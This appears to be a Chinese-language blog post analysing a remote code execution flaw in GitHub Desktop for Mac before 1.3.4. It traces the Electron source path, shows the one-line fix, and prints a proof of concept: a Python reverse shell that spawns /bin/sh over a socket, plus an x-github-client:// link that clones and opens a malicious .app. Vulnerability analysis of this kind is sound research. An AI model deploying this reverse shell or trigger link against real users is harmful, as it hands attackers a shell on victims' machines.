---
layout: post
title: Github Desktop for Mac < 1.3.4 RCE 漏洞分析
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;白天看到老外在H1-702 2018玩的项目，electron的案例不多，感觉有点意思复现下。

> 准备工作：

* https://github.com/desktop/desktop/archive/release-1.3.3.zip
* 恢复下.git/目录以及所需的文件
* yarn install
* yarn build:prod
* mv dist/GitHub Desktop-darwin-x64/GitHub Desktop.app /Applications


> 漏洞成因:

首先github的`Clone or download`按钮包含一个`Open in Desktop`的pull方式

验证时发现目前该方式的协议为`github-mac://`但早起版本的协议应该是`x-github-client://`，并且包含几个参数:

```
x-github-client://openRepo/https://github.com/user/repo?branch=master&filepath=README.md
```

app/src/lib/app-shell.ts

```
export const shell: IAppShell = {
	moveItemToTrash: electronShell.moveItemToTrash,
	beep: electronShell.beep,
	openExternal: path => {
		return new Promise<boolean>((resolve, reject) => {
			ipcRenderer.once(
				'open-external-result',
				(event: Electron.IpcMessageEvent, { result }: { result: boolean }) => {
					resolve(result)
				}
			)

			ipcRenderer.send('open-external', { path })
		})
	},
	showItemInFolder: path => {
		ipcRenderer.send('show-item-in-folder', { path })
	},
	openItem: electronShell.openItem,
}
```

ipcRenderer对象使用`show-item-in-folder`事件发送获取到的path

跟进app/src/main-process/main.ts

```
ipcMain.on(
	'show-item-in-folder',
	(event: Electron.IpcMessageEvent, { path }: { path: string }) => {
		Fs.stat(path, (err, stats) => {
			if (err) {
				log.error(`Unable to find file at '${path}'`, err)
				return
			}

			if (stats.isDirectory()) {
				openDirectorySafe(path)
			} else {
				shell.showItemInFolder(path)
			}
		})
	}
)
```

ipcMain对象监听到该事件消息后，fs库判断下是否为目录，如果是则传进`openDirectorySafe`。但没有考虑到mac系统下.app也是为目录的

```
> fs = require('fs')
> fs.stat('/Applications/GitHub Desktop.app',(err,stats)=>{console.log(stats.isDirectory())})
> true
```

跟进app/src/main-process/shell.ts

```
export function openDirectorySafe(path: string) {
	if (__DARWIN__) {
		const directoryURL = Url.format({
			pathname: path,
			protocol: 'file:',
			slashes: true,
		})

		shell.openExternal(directoryURL)
	} else {
		shell.openItem(path)
	}
}
```

判断如果是mac系统则使用`file://`协议重新构造url，并`shell.openExternal`运行。

> POC:

作者编写的py版本<a target="_blank" href="https://github.com/0xACB/github-desktop-poc">POC</a>，并用Pyinstaller打包了起来

```
import socket,subprocess,os;

os.system("open -a calculator.app")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("localhost",1337));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

本地监听，浏览器打开包含指定POC APP的链接：

```
x-github-client://openRepo/https://github.com/0xACB/github-desktop-poc?branch=master&filepath=osx/evil-app/rce.app
```

浏览器询问是否使用GitHub Desktop.app打开，确定并开始clone，随后反弹shell。

> Fixed:

fix方式很简单，判断不是mac系统最终才可以打开

```
-        if (stats.isDirectory()) {
+        if (!__DARWIN__ && stats.isDirectory()) {
```